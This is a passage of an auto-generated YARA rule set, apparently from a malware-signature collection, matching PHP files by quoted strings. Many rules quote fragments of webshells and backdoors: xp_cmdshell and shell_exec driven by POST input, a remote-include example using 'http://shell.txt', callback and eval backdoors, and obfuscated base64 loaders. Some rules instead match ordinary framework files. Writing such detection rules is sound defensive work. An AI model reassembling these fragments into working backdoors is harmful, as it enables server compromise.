      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4bf9039fea11c306003bac6310e58adbfc3923c0886fb87cdfd56f17787b1f42"
   strings:
      $s1 = "* @author    Ivan Vorontsov <ivan.vorontsov@phalconeye.com>" fullword ascii
      $s2 = "* @link      http://phalconeye.com/" fullword ascii
      $s3 = "| Copyright (c) 2013-2014 PhalconEye Team (http://phalconeye.com/)       |" fullword ascii
      $s4 = "$content[$widget->layout][] = $renderer->renderWidgetId($widget->widget_id, $widget->getParams());" fullword ascii
      $s5 = "| Author: Ivan Vorontsov <ivan.vorontsov@phalconeye.com>                 |" fullword ascii
      $s6 = "* After route execution." fullword ascii
      $s7 = "* @method \\Engine\\DIBehaviour|\\Phalcon\\DI getDI()" fullword ascii
      $s8 = "public function afterExecuteRoute()" fullword ascii
      $s9 = "* Render some content from database layout." fullword ascii
      $s10 = "* @copyright 2013-2014 PhalconEye Team" fullword ascii
      $s11 = "$this->assets->getEmptyCssCollection()" fullword ascii
      $s12 = "$this->assets->getEmptyJsCollection()" fullword ascii
      $s13 = "* @author    Piotr Gasiorowski <p.gasiorowski@vipserv.org>" fullword ascii
      $s14 = "* Disable header rendering." fullword ascii
      $s15 = "* @param null|string $controller Related controller name." fullword ascii
      $s16 = "| to license@phalconeye.com so we can send you a copy immediately.       |" fullword ascii
      $s17 = "public function renderContent($url = null, $controller = null, $type = null)" fullword ascii
      $s18 = "->addJs('assets/js/core/widgets/autocomplete.js')" fullword ascii
      $s19 = "* @property \\Phalcon\\Translate\\Adapter $i18n" fullword ascii
      $s20 = "* @property \\Engine\\Config             $config" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule sig_239c83f4ca1dd55e0024858f780af365401b0d61
{
   meta:
      description = "php17 - file 239c83f4ca1dd55e0024858f780af365401b0d61.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8450fde6681a1e823f59a8e486da9d0b19164d50a31931c11d813271ef5af34d"
   strings:
      $s1 = "[O1WsWM):Tl!*ZXi1WVK.laA2~c+ NE@#@&]IUEA}fe~Pi?/]}SJAz] C(VCdqM_K /rdr]),aoowsswI?;IrdJ$b\"OUC)f6" fullword ascii
      $s2 = "[RmKVKDla33~c+ p8WMNn.=Fwa~kWsk9l[!XZ*Z*8r@#@&.DkJ ZP4C^0oDK;x9OmKsGD=aZ*T*TXp4GD9nD=!2a)J@#@&]M/ER1h9" fullword ascii
      $s3 = "D+P{POrt2I@#@&Y_2Kb\\3'1?:IcqHPv`cK&\\+M RPbH2]q*eq!ZTZPb3!c*#JFZb@#@&I]/,J@!8M@*@!6GxDP/Dzs+{B6WUYRdbyn)8+wXB@*" fullword ascii
      $s4 = "v@*;WwH@!&l@*J@#@&~P~~kqx?b'J,P@!C,tDnW{B%l7Ckm.bwD)s!V^oWM:cJrJ'.AnVz/+vwb:4'J'JL0 x)\\A~E-rSJ'-EbLJJESrJ9+^oKV[" fullword ascii
      $s5 = "D@*v*iJ@#@&\"IjJknDKrs+KEYvB9Gm!:nxDRCs^RH|jm4E:m^4+MRkE8:rOv#IBB*!Z!bIr@#@&]]UJ@!zk^Mk2D@*r@#@&1lknPy@#@&/" fullword ascii
      $s6 = "#~_,qBPsAxvHb:Z_ .zSi+*PR~&x?:.`sbY1u .zS`+SPEErJbP ~F*~E&r~JwE*@#@&di7bs~gr:Pm42;V+XYcsUrqjco2Dn6D+1Ur61" fullword ascii
      $s7 = "*[m4.`O,#L^4DvF8Fb[^4M`q!Ob[1t.cWG#'^4DcF8X*[^4DvF Z#L^tM`*G*[^4M`F8X#LmtMc*v*[1t.`1{*[^tMcF8*b'1tDcq8 b[14M`" fullword ascii
      $s8 = "\"kkPB9.Ghk/mwv'n2HY~BkdlaBxnslx~O!wUk@!@*DxG6z@!@*BD/K2B{NGtD+h~EJJLsD`[JrvxxKkDmCPh.K0@!@*M4@!@*l&@!rJ[nhm1sV" fullword ascii
      $s9 = "4(^2Pv[/DlD:~QP8!*P@!P[3gf@#@&,~P,P~[b219~{PrxkOMAcG?DbD:~D[bB\\$Z\"VW~LP\\~^D^s#3f@#@&,P,P~PP+cYenA~',F~l,K  \\}f3P{f,)~D cWw" fullword ascii
      $s10 = "19~bs@#@&~,P~P,n^/n@#@&,PP,P,~P:  YHn3~{FP=~KyRH}[3P{&,)~Y+ }wnx@#@&P,P~~,PPPqcnG/bObrU,',fk" fullword ascii
      $s11 = "GY,Ij Ars@#@&,P~P&o,IdvJ:bAd2|P5h2E#{JP)~S2r~Y_21@#@&7P,Ygb\\+x.U`EKz$SA{H)t2Jb@#@&P~P,~,?({/&[J@!Y9~l^kLx{mnUD+D@*@!l,tD" fullword ascii
      $s12 = "PY_nU@#@&did7?COM230K]HGA~rD2: KmYu~,.k~~UYM+ls@#@&7diPnVU+@#@&iddirs,k1UP.`U5ksrV3J&/P~,E^rP'~&Y2h " fullword ascii
      $s13 = "@!zl@*@!JON@*@!&YM@*E~,PP,~P,@#@&\"]dJ@!YM@*@!Y[@*@!mnxDnD@*@!4.,tkL4D'qPSr9Y4{B8!!uB@*EP,P~P,P~@#@&IIUE@!DD@*@!O[PmVboU'^n" fullword ascii
      $s14 = "6M2^m/AP',Y\"i+@#@&.+V+a TSW(CS,'P:];+@#@&\"2L2a hbOKA.x,'~E'4S)HVj)MAwkex'/C$JrTQw/C`-4km.raYuNdmMkwDk%l7lkm.k2O*Rnx1GN" fullword ascii
      $s15 = "?:]`tlPm4R-CdE+B~J@*J#*@#@&didUI/?nnnPxPbU?DDcqBPKh2^lV+yS,JdMmr~P8#@#@&did(0,?./U++0~@*,!PDu3x@#@&id7dd.1/320+P{P(HUKDcj\"mj2" fullword ascii
      $s16 = "xOOPza+lPrSF*_q*@#@&P~~,P~P,oAx9,',k1UYMcsUK)D:~O(g~.(/I*@#@&,~~P,P,PO0s wkJ+kPlMY~x9k+U9@#@&~P,~,P~,KwVRwq^3?&y3P{P[j:bDD~OGk+" fullword ascii
      $s17 = "P9l:+;D3lOnvYu+h)Y_#'E@!zY[@*@!Y[@*r'DCn9l:2[r@!JON@*@!&YM@*E@#@&ddi7d\"+nK]OP{PM2KW]PLJ@!YM@*@!DN@*ELY2\\KLJ@!zD[@*@!O9@*r[M" fullword ascii
      $s18 = "'8JPLP78ZMSWPLPER\"lYbG/;D+9rO'ZJ,[~\\8/MSWPL~J p;GDlZ;.M+UY{TrP',\\(ZDd0,'PrO}EKYC\\m6ks;:{!J,'~\\(ZMSWP'~|@#@&P,~P,P~~rOHCr" fullword ascii
      $s19 = "DPU+M-+MR\\lawCO4`J'r:mo+kwE#@#@&Dl.onOalOt{cJ'- wr[?n.7+.RtCawCDtvJ-b:mL+k-swDF CkwJ*b@#@&0/K ^WaX6ks+~WbVnwmOtBYC.T+Y2CDtSYM;" fullword ascii
      $s20 = "mDkGxEb@#@&7ZKUxkY]xrnDG-bNnD{j5S6d2GAR8iGCYmPjW!D^n{JPL~YzIoAP(w,[r~E[~KKIO1`hPLJIik+D~(G'sl0nyiKm/khWMN{IJ@#@&7ZK1H ;rxg3ZDkr" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 400KB and
      8 of them
}

rule AdminAssetController
{
   meta:
      description = "php17 - file AdminAssetController.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "85f5f6478f01a270f9b4fc6260c029364d49d97faa1decbfe73de694f000729a"
   strings:
      $s1 = "// | Copyright (c) 2013-2018 http://www.thinkcmf.com All rights reserved." fullword ascii
      $s2 = "$result = Db::name('asset')->field('a.*,u.user_login,u.user_email,u.user_nickname')" fullword ascii
      $s3 = "// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )" fullword ascii
      $s4 = "< 449134904@qq.com>" fullword ascii
      $s5 = "// +----------------------------------------------------------------------" fullword ascii
      $s6 = "$file_filePath = Db::name('asset')->where('id', $id)->value('file_path');" fullword ascii
      $s7 = "* @adminMenu(" fullword ascii
      $s8 = "namespace app\\user\\controller;" fullword ascii
      $s9 = "['__USER__ u', 'a.user_id = u.id']" fullword ascii
      $s10 = "*     'display'=> false," fullword ascii
      $s11 = "*     'hasView'=> false," fullword ascii
      $s12 = "*     'parent' => 'index'," fullword ascii
      $s13 = "*     'order'  => 10000," fullword ascii
      $s14 = "*     'icon'   => 'file'," fullword ascii
      $s15 = "$this->assign('assets', $result->items());" fullword ascii
      $s16 = "$this->assign('page', $result->render());" fullword ascii
      $s17 = "*     'hasView'=> true," fullword ascii
      $s18 = "*     'parent' => ''," fullword ascii
      $s19 = "*     'param'  => ''" fullword ascii
      $s20 = "Db::name('asset')->where('id', $id)->delete();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule sig_54ea4df70c48d37ba199b58ee2426f3ef9744c37
{
   meta:
      description = "php17 - file 54ea4df70c48d37ba199b58ee2426f3ef9744c37.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ad71e80ee519a1aeb05cfa945fe0f89e1a0c4a4b275bedb4563003871c7f6cf7"
   strings:
      $s1 = "TXFVSExZWlRyUmpsbnlrZE9HVkJLYWVtY3BEZ3pKaEV0WFFpQVd4RlBDc3dUbFdJU2p2dUNBT29reUhWWW1FYkxwc2VOZFJ6RG5KZmNncmlhaHhaS3RHVVhGUFFCTXFC" ascii
      $s2 = "cjlUbm9YaUdkUjJ5RlRsaFE5R1YxV09GcGV4aDEwZ05UPT0iO2V2YWwoJz8+Jy4kTzAwTzBPKCRPME9PMDAoJE9PME8wMCgkTzBPMDAwLCRPTzAwMDAqMiksJE9PME8w" ascii
      $s3 = "MCgkTzBPMDAwLCRPTzAwMDAsJE9PMDAwMCksJE9PME8wMCgkTzBPMDAwLDAsJE9PMDAwMCkpKSk77\"));" fullword ascii
      $s4 = "$O00OO0=urldecode(\"%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A\"" ascii
      $s5 = "$O00OO0=urldecode(\"%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A\"" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule sig_6f97f607a3db798128288e32de851c6f56e91c1d
{
   meta:
      description = "php17 - file 6f97f607a3db798128288e32de851c6f56e91c1d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "eccbd4637404affdea9a8231e7f9d4cd8e50a86992d39e5dae4cc1ae1efc8a61"
   strings:
      $s1 = "$payload = array('test',$_POST['faith']);" fullword ascii
      $s2 = "uasort($payload, base64_decode($act));" fullword ascii
      $s3 = "$arr = array('test' => 1, $_REQUEST['pass'] => 2);" fullword ascii
      $s4 = "$act = $_POST['act'];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_53aad67787c693e8c9fbeb79fb6330e1dee3ff38
{
   meta:
      description = "php17 - file 53aad67787c693e8c9fbeb79fb6330e1dee3ff38.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e762daa7ef0e5fe9088282cafb2fc2bb7bd371007ddadc987b0fb05c0e184512"
   strings:
      $s1 = "$arr = array($_POST['pass'],);" fullword ascii
      $s2 = "array_filter($arr, base64_decode($e));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule a79be3a055b701ad9977b5176d0478aa0b0dffd4
{
   meta:
      description = "php17 - file a79be3a055b701ad9977b5176d0478aa0b0dffd4.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b7c6ce332434850db4448f8d2bf26157a6aa4ae1afb43bd5829ee6167b561c85"
   strings:
      $x1 = "@mssql_query(\"insert into SnIpEr_SA_temp_table EXEC master.dbo.xp_cmdshell '\".$_POST['test4_file'].\"'\",$db);" fullword ascii
      $x2 = "'ar_text85'=>'Test bypass safe_mode with commands execute via MSSQL server'," fullword ascii
      $x3 = "$_POST['cmd']=\" http://target.com/ini.php?ss=http://shell.txt? " fullword ascii
      $x4 = "else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - suc" ascii
      $x5 = "/* The command is not an internal command, so we execute it after" fullword ascii
      $x6 = "filename.php?ss=http://shell.txt?').ws(4).in('submit','submit',0,$lang[$language.'_butt65']));" fullword ascii
      $x7 = "$_POST['cmd']=\"echo \\\"Now script try connect to \".$_POST['ip'].\" port \".$_POST['port'].\" ...Datached\\\"\";" fullword ascii
      $x8 = "my \\$processo = '/usr/local/apache/bin/httpd -DSSL'; # Nome do processo que vai aparece no ps #" fullword ascii
      $s9 = "* as an internal shell command. */" fullword ascii
      $s10 = "echo \"<p>Dont Forget to Delete Loader.pl in /tmp</p>\";" fullword ascii
      $s11 = "echo\"<div class='foot'>Version $version &copy; \".date('Y').\" <a style='text-decoration:none;' target='_blank' href='http://w" fullword ascii
      $s12 = "/*  MAIL http://sniper-sa.com , http://sniper-sa.com" fullword ascii
      $s13 = "print \"<center><div id=logostrip>Something is wrong. Download - IS NOT" fullword ascii
      $s14 = "$string = shell_exec($_POST['command']);" fullword ascii
      $s15 = "@print \"<img src=\\\"http://127.0.0.1/version.php?img=1&version=\".$current_version.\"\\\" border=0 height=0 width=0>\";" fullword ascii
      $s16 = "if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],\"w\")) { err(2,$_POST['mk_name']); $_POST['cmd']=\"\"; " fullword ascii
      $s17 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=(!$unix)?(\"dir\"):(\"ls -lia\"); }" fullword ascii
      $s18 = "print \"<center><div id=logostrip>Download - OK." fullword ascii
      $s19 = "ttp://sniper-sa.com>http://sniper-sa.com</a> | <a SnIpEr.SA@hotmail.com>sniper.sa@hotmail.com</a> | " fullword ascii
      $s20 = "$this->dump[] = 'INSERT INTO `'.$table.'` (`'.@implode(\"`, `\", $this->columns).'`) VALUES (\\''.@implode(\"', '\", $thi" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 600KB and
      1 of ($x*) and 4 of them
}

rule Anjiyo_abf229975796ff6a16ac459bf91fe81f2b8f9510
{
   meta:
      description = "php17 - file Anjiyo_abf229975796ff6a16ac459bf91fe81f2b8f9510.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "16c344cdf9670fcef82e76fac0c568fd450e26466c0945e45360d733ac658b84"
   strings:
      $x1 = "<?php /* This file is protected by copyright law and provided under license. Reverse engineering of this file is strictly prohib" ascii
      $s2 = "MDBPTzAwJ10oJE8wMDBPME8wMCwweDU3Zik7JE9PMDBPMDBPMD0kR0xPQkFMU1snT09PMDAwME8wJ10oJEdMT0JBTFNbJ09PTzAwMDAwTyddKCRHTE9CQUxTWydPME8w" ascii
      $s3 = "ME9PMDAnXSgkTzAwME8wTzAwLDB4MWE4KSwnRW50ZXJ5b3V3a2hSSFlLTldPVVRBYUJiQ2NEZEZmR2dJaUpqTGxNbVBwUXFTc1Z2WHhaejAxMjM0NTY3ODkrLz0nLCdB" ascii
      $s4 = "bfnDacBGL96BriYYaiRTakxTlkNUTF3UzyMDoCzcMprKeYeYLxHDrAXBTfnWAynUB5XaafwAlOJHlPXcekoGapOWAylTM9ZTuLvBuL4GLxHDzaNTraQaml5KAstf0rZH" ascii
      $s5 = "2fZd3aVct1jd2xvFjPIF2lSfMaZKX0hwtEIwuOlGuWsF2iico93KjnXGtEXFuIIHbn4wtH3YTF1YzA7eWp9eWp0CBkScbSYtJEIwtnJd3kLcbw6wenXGtEjcokLCMOJK" ascii
      $s6 = "uXPkrYPcBYqHUEMHuIzOLCpKX0hkrYPcBYqHUE9wtIPkrYPcBYqHUE+NjWpwtCXGeYeHeEXwtLIgtILW2ilC2SxwtCXGeYoOLCpKX0hkyWxwe0IhtIPhtOeDoajDzrIk" ascii
      $s7 = "BlNGmynA21SHBaRAlw1OLaxfAiPh1atArI1HMcvCjYWH3a3fmi3YuH2KrkRa252TAkTBmiJBBP4WmW2aocWcLp1UyEzKukmUlctU2fwa2pvHopbdB9JdLL5Ho96ABcef" ascii
      $s8 = "j4MdMkzFeS8R2w+NolVFua0wo5idBA9k2YvdB1idMWmwucidualNUfpctFIF3O5doA9k2kvFMOlFjPIHun4woOvfuOlctEjOLCXHeEXKZnMd250RBcidBlSGTp0CUFIF" ascii
      $s9 = "TniCbfxTjalDU9jcrOSAMYnDAc3ULakO3C0Uul5TyODFeO0FUSvGmlBT3i3T0yTBr8qGaaxaAL2To0vc0i4DAkHOoljYM82HlawDLf1TyfOULaqdzL5aeluczfnFoaaB" ascii
      $s10 = "oyzF20phW0hGX0hdolzfoyZb3OJFZILb0fyaySmcokVCB1lk10pKX0hgW0hcBxzcW0hGX0hcBYPdZELdoaVc3aiDMadKeyfKX0hgW0hgW0hcBxzcBlMwtIPkolLb21ld" ascii
      $s11 = "bW5GjL1D3nxHAloYrYOh1yvU3ynDycpBjYJFLyVT2xYAaplOrayd1nhcLa6c09yOlW1FbOVTMprUziuDo5naM82c0yQUMS5AMiqUaliGBatGoiyO1OSY0aqd3n0DlaVF" ascii
      $s12 = "BYPdZELdoaVc3aiDMadKeyfKX0hgW0hgW0hcBxzcBlMwtIPkolLb21ldmA9NUfLfB1XH3wmhUEMkJipF3YlftILb0fyaySmcowmbULphW0hGX0hDBCIholzF2a0htOgO" ascii
      $s13 = "zrmwo5idBA9k29XcUF+eWP8d3n0DB9VwucidualNUfJCbYlYjWmNLkiF2A2YeXvd3n0DB9VNI0hNo9XfolvdJn2CBx1cT0mc3ppdMcSCbOlkz5zfukgFM90HTHIRUnmG" ascii
      $s14 = "MlVcMxifoAIRUnJCbYlYjW8R29Xfolvdj4YtjxvFuOpd24IfMySfBA9k3Y0FJF+F3OZb3kvferzwt0Ic3ppdMcSCbOlwt0IF3OZb3kvferzwt0ICMyzcTC0Nt9vFuOpd" ascii
      $s15 = "oljd25vNT0mdolVDZFpeWp7eWPLdB9zfukiFl9pC29Vdz0mDactT1k3Hrsuc29nWAynTlYaDraac0ynWAknWAynWayeWalnWAyncjIvKBinWAynWM1hTywXAArvf0WvW" ascii
      $s16 = "JOiFMYPDbcvhULVkzXvfoW+eWPktWLktUE8foW+eWPktWLktUE8CUnPFMaMNUw/DBW9FM1gcMlScUcMDBXzNUFVFMaidunifoIPkoOpFJ4mRZFVkoyZC2ipfM8pRJFMc" ascii
      $s17 = "jxpdmn1ftn0GbnlNUk0cbi0wJnVCB1lNUkjGJwIF2l6cT0JYTEJwucidualNUkHHlCXBbL5f1lCTmpLHlr9wJEvNjxpdmn1ftn0GbnlNUkzfBksDbWJwucidualNUkNU" ascii
      $s18 = "BymcUImcbYXkZL7eWppcJEPDbYzcbWPky9uOaOdk2ivF3Osk10pwtCMDbYzcbWPky9uOaOdk3azcbksk10phW0hGX0hkoivF3Oswe0ICMyzcTC0b2OlC29LcUILb0fya" ascii
      $s19 = "AynOLpUaBfnWB5nW0fnUmlldLlTO2iYY1n6fBcVHbCvAr1cAAynWBfkW0ynWAynWAynWAynWAynWAynWAynWAynWAynWAynWAynWAynWAynWAynWAynWAynWAynWAynW" ascii
      $s20 = "2iiFmHPky9uOaOdk2ivF3Osk10pRJFJNJFVkoxldMf1CBplBzw1bU4mNt9iNJF7eWp9eWp9eWpMfB5jfolvdJn2cbkgF2YPcB1ihtOVd21JFMagfoyJdorSkoOJdMysc" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule a94145b299b57919659d761c53de4b5ce99b5fea
{
   meta:
      description = "php17 - file a94145b299b57919659d761c53de4b5ce99b5fea.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "66bbcafda040a101a7b678da62099d9fac10d22e68f16b1e8179827e4668aaae"
   strings:
      $s1 = "$Q='(\"|{/\",|{\"+\")|{|{,$ss($s[|{$i]|{,|{0,$e)))|{,$k)));$o=ob_|{get_contents(|{);o|{|{b_end_clean();$|{d=ba';" fullword ascii
      $s2 = "$x='|{se64_enc|{o|{de(x(gzcompre|{ss|{($o)|{,$k|{)|{);print(\"<$k>$d</|{$k|{>\");@session|{_destroy|{();}}}}';" fullword ascii
      $s3 = "$N='t();|{@ev|{al(@gz|{uncomp|{res|{s(|{@x(@bas|{e|{64_decode(preg_re|{pla|{ce(array(|{\"/_/\",\"|{/-/\"),a|{rray';" fullword ascii
      $s4 = "$S='{;}$r=$_|{SERVER;$rr=@$|{r[\"HT|{TP_|{REFERER\"]|{;$ra=@$r[|{\"HTTP_A|{CCE|{PT_L|{ANGUAG|{E\"];if($|{rr&&$';" fullword ascii
      $s5 = "$M='key_exist|{s($|{i,$s)){$s|{[$i|{].=|{$p;$e=str|{po|{s($s[$i],$f);|{if(|{$e){|{$k|{=$kh.$|{kf;ob_star';" fullword ascii
      $s6 = "$F='ch_all(\"/([\\\\|{w])[|{\\\\w-]+(?:;|{|{q=0.([\\\\d|{]))?|{,?/|{\",$ra,$m);|{if($q&&$m|{){@sessi|{on_|{start();|{$';" fullword ascii
      $s7 = "$v='{or($i|{=0;$i<|{$l;|{){for($j=0;($j<$c&&$i|{<$l);$j++|{,$i++|{){$o|{.=$t{$i}^|{$k|{{$|{j};|{}}retu|{rn $o|';" fullword ascii
      $s8 = "$z='ra){$|{u|{=par|{se_url($rr);|{pa|{rse_str(|{$u[\"query|{|{\"|{],$q);$q|{=a|{rray_val|{ues($q);|{preg_m|{at';" fullword ascii
      $s9 = "$n='|{$kh=\"|{5d41\";$k|{f=\"40|{2a\";function x($t|{,|{$k){$c=strl|{e|{n($k);$l=st|{rle|{n($t);|{|{$|{o=\"\";f|';" fullword ascii
      $s10 = "$O='s=&$|{_|{SESSI|{ON;$ss=\"subst|{r\";$sl=|{|{\"strtolowe|{r\"|{;$i=$m[1][0]|{.$m[|{1][1];$h|{|{=$sl($ss(md5|{|{';" fullword ascii
      $s11 = "$W='($i.$kh|{),0,3|{));|{$f=$s|{l($|{ss(md|{5($|{i.$kf),0|{,3));$p=\"\";for($z=1;$|{z<coun|{t($|{m[1]);$z+|{';" fullword ascii
      $s12 = "$e='+)|{$p.=$q[$m|{[2][|{$z]];i|{f(|{str|{pos($p,$h)=|{==0){|{$s[$i]=\"\";$|{p=$s|{|{s($p,3);}if|{(a|{rray_';" fullword ascii
      $s13 = "$d=str_replace('|{','',$n.$v.$S.$z.$F.$O.$W.$e.$M.$N.$Q.$x);" fullword ascii
      $s14 = "$A=str_replace('mZ','','crmZeatmZmZe_mZfunmZctimZon');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_93542f1da65168cfd713c6b6d2290373951fdfb8
{
   meta:
      description = "php17 - file 93542f1da65168cfd713c6b6d2290373951fdfb8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "eea2079263cf6392496ec8d0e7e5be5c3f112cf6bd5060304aaabe4cfcc37f10"
   strings:
      $s1 = "<?php echo \"Exec privs on \".$_SERVER[\"PHP_SELF\"]; ?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AlertBlock
{
   meta:
      description = "php17 - file AlertBlock.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f6f2df691b8512d835ae549ceede36c70ebc29224b99815f08ac051d50585469"
   strings:
      $s1 = "* Alert block widget that groups multiple `\\kartik\\widget\\Alert` or `kartik\\widget\\Growl` widgets as one single block." fullword ascii
      $s2 = "* @copyright Copyright &copy; Kartik Visweswaran, Krajee.com, 2014" fullword ascii
      $s3 = "* @author Kartik Visweswaran <kartikv2@gmail.com>" fullword ascii
      $s4 = "* You can choose to automatically read and display session flash messages (which is the default setting) or setup" fullword ascii
      $s5 = "* @package yii2-widgets" fullword ascii
      $s6 = "* @version 3.4.1" fullword ascii
      $s7 = "* your own block of custom alerts." fullword ascii
      $s8 = "namespace kartik\\widgets;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php17_12345
{
   meta:
      description = "php17 - file 12345.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b901b76eeb426b480ea19504cbe09a9e252af5f8979777eac5bc29702387e985"
   strings:
      $s1 = "$myurl='http://www.zjjv.com';//" fullword ascii
      $s2 = "3Ve+sKNHLuFtP/zpe//hhf/5u78oz+WUKhZyE3elrl4bY70xuT" fullword ascii
      $s3 = "QaOkHSwetBfjpSHLfdrSwGrITkAl4NeAYWB5ANEYeQOMCsMK1Q" fullword ascii
      $s4 = "RvL60vXjRv6pjwLzGPfe/LbsOcvl3fbNi92bSxv5Ztg8dLl5Kd" fullword ascii
      $s5 = "OpqdXVfCBZfjRPdni1iYFZOX/xBHlogZFnrjYJyhpjWvrkoKnc" fullword ascii
      $s6 = "4FMGIYk6p4Vbyu9+wAfTPpb+dfaQ79Hvwe/g4aPaCO/oj4mLL5" fullword ascii
      $s7 = "wIui+t/gBcsvHkJCFZcEQxxlRSugfVjXA/hIzkRjFRLogykm2S" fullword ascii
      $s8 = "oMM5VHOcvAi+ndbMaMqmfGEtsEXIgT7lrzsB1w4jQFfUHzZ65A" fullword ascii
      $s9 = "4NCJOhINHlxJp8Md5iWwGZPCYDlgGBuUJN6bDNhnsADlLve8Iq" fullword ascii
      $s10 = "0A5kXzBtazYaHXtkUgEtigSd1KbR00grmOksD1vRTL2g8sw3d8" fullword ascii
      $s11 = "V8wjiGcpu0JkBzps8H80MZDk8U5lkLdsx9JghqWvdjusPyJAi6" fullword ascii
      $s12 = "bu2JKD2QLRAR9aHrN30RGaGTNih34JBlPDAfVnLlOGMXA3tpNU" fullword ascii
      $s13 = "$password='redhat';//" fullword ascii
      $s14 = "kEyQQIaCKTh4GfBa17bQLDFdpkPLcTDT0NsxeKGThRnWpUkmCU" fullword ascii
      $s15 = "rFEOVkarrI8w8POkqzzMtMpu/0LXZS9EruVfJMFKqj+I7GmGsG" fullword ascii
      $s16 = "bbpc4BGEWQrRBgnk+FEauyH0b1nvnoF1b+tport2aIApeA4++U" fullword ascii
      $s17 = "4CsAJ+jcHSQq4Wg2kpbfC2kEyXjgyQai5TMmLIxcNPgno8oHBb" fullword ascii
      $s18 = "B0FbaFtmPmmgZ3s0NQE9OPmTxojoHgUMvoygzi4dEg3KTPdObA" fullword ascii
      $s19 = "ravd5p89RCOmDLWa/acU1OBrRcXXK9oliP/pUsON3cWVWOPNKD" fullword ascii
      $s20 = "ndRUNyt2jJZynKtQxKCd2umkg5Eoj5ct3jk/rbQx4mt+j5omVf" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule sig_2012_12_06_225929_migration_cartalyst_sentry_install_groups
{
   meta:
      description = "php17 - file 2012_12_06_225929_migration_cartalyst_sentry_install_groups.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "db8f8ae5ad6407588e1659d5c63464726f63e1b7fdf4ce7146ac68cd4d5db98a"
   strings:
      $s1 = "* the following URL: http://www.opensource.org/licenses/BSD-3-Clause" fullword ascii
      $s2 = "* @link       http://cartalyst.com" fullword ascii
      $s3 = "* bundled with this package in the LICENSE file.  It is also available at" fullword ascii
      $s4 = "* This source file is subject to the 3-clause BSD License that is" fullword ascii
      $s5 = "* @copyright  (c) 2011 - 2013, Cartalyst LLC" fullword ascii
      $s6 = "* Licensed under the 3-clause BSD License." fullword ascii
      $s7 = "* Part of the Sentry package." fullword ascii
      $s8 = "// support the indexes, other engines aren't affected." fullword ascii
      $s9 = "* @version    2.0.0" fullword ascii
      $s10 = "* @license    BSD License (3-clause)" fullword ascii
      $s11 = "* @author     Cartalyst LLC" fullword ascii
      $s12 = "// We'll need to ensure that MySQL uses the InnoDB engine to" fullword ascii
      $s13 = "* @package    Sentry" fullword ascii
      $s14 = "$table->text('permissions')->nullable();" fullword ascii
      $s15 = "Schema::create('groups', function($table)" fullword ascii
      $s16 = "Schema::drop('groups');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule a7a9f352676803c4b10f0d91e9b214b00322a47d
{
   meta:
      description = "php17 - file a7a9f352676803c4b10f0d91e9b214b00322a47d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1820bcc8465555c788dccf48eb8f628a7dff4d2a0d2d23fbe95befe2b1164c4c"
   strings:
      $s1 = "//die(var_dump($comment));" fullword ascii
      $s2 = "* eval($_POST[1]);" fullword ascii
      $s3 = "//die(var_dump($pos));  " fullword ascii
      $s4 = "$comment = $rc->getDocComment();" fullword ascii
      $s5 = "$eval=substr($comment,$pos,16);  " fullword ascii
      $s6 = "$pos = strpos($comment,'eval');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule activeLink_mssqlDAL_class
{
   meta:
      description = "php17 - file activeLink_mssqlDAL.class.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b4ffba8de035108b075e500e9d9cc95c4537cec6099ac949501a10db81bd5dec"
   strings:
      $s1 = "function  GetPageCount(activeLinkModel $model, $perPageCount)" fullword ascii
      $s2 = "function  GetPageList(activeLinkModel $model, $start, $limit)" fullword ascii
      $s3 = "function  GetList(activeLinkModel $model)" fullword ascii
      $s4 = "function  GetModel(activeLinkModel $model)" fullword ascii
      $s5 = "// TODO: Implement GetPageCount() method." fullword ascii
      $s6 = "// TODO: Implement GetPageList() method." fullword ascii
      $s7 = "// TODO: Implement GetModel() method." fullword ascii
      $s8 = "// TODO: Implement GetList() method." fullword ascii
      $s9 = "function  InsertInto(activeLinkModel $model)" fullword ascii
